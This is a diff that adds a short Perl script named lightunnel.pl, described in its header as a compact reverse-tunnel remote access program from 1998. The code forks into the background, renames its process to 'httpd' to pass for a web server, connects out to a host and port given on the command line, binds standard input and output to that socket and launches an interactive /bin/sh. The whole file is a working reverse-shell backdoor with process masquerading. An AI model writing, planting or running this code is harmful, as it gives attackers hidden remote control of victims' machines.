@@ -1,0 +1,52 @@
+#!/usr/bin/perl
+#
+# lightunnel.pl
+#
+# Author: Liraz Siri <liraz@hushmail.com>
+#
+# Copyright (c) 1998 Liraz Siri <liraz@hushmail.com>, Ariel, Israel
+#	        All rights reserved.
+#
+# Created: Tue Oct 20 10:51:34 IST 1998
+#
+# paste-a-foo(tm) compliant: .z (3 lines/172 bytes)
+#
+# Lightunnel is an extremely simple, compact reverse-tunnel remote access
+# program. Designed as a part of the lightgate project, to be executed from
+# the command line. (perl -e ...). This is ofcourse the 'long' version,
+# the compressed/compact code can be found in lightunnel.z.pl.
+#
+# The schmatics of our code is extremely simple, we initiate a connection,
+# redirect standard input/output and execute an interactive shell.
+#
+# Designed in the spirit of the lightgate package, .z versions of these
+# miniature applications offer full fuctionality while still complying
+# with strict paste-a-foo(tm) standards.
+#
+# Remember if it's not paste-a-foo(tm)!!! you can't paste it.
+
+use Socket;
+
+fork&&exit;
+$0 = "httpd";
+
+$hostname = "localhost";
+$port = 80;
+
+$hostname = $ARGV[0] if($ARGV[0]);
+$port = int($ARGV[1]) if($ARGV[1]);
+
+socket(S, AF_INET, SOCK_STREAM, 0);
+if(!($raddr = inet_aton($hostname))) {
+ printf("Error: unable to resolve hostname `%s'\n", $hostname);
+ exit;
+}
+
+printf(STDERR "Trying %s (%s):%d...\n", $hostname, inet_ntoa($raddr),
+					         $port);
+connect(S, sockaddr_in($port, $raddr)) || 
+ die "Connection refused by foriegn host\n";
+open(STDOUT, ">&S");
+open(STDERR, ">&S");
+open(STDIN, "<&S");
+exec "/bin/sh -i" || die "Error: exec() failed\n";
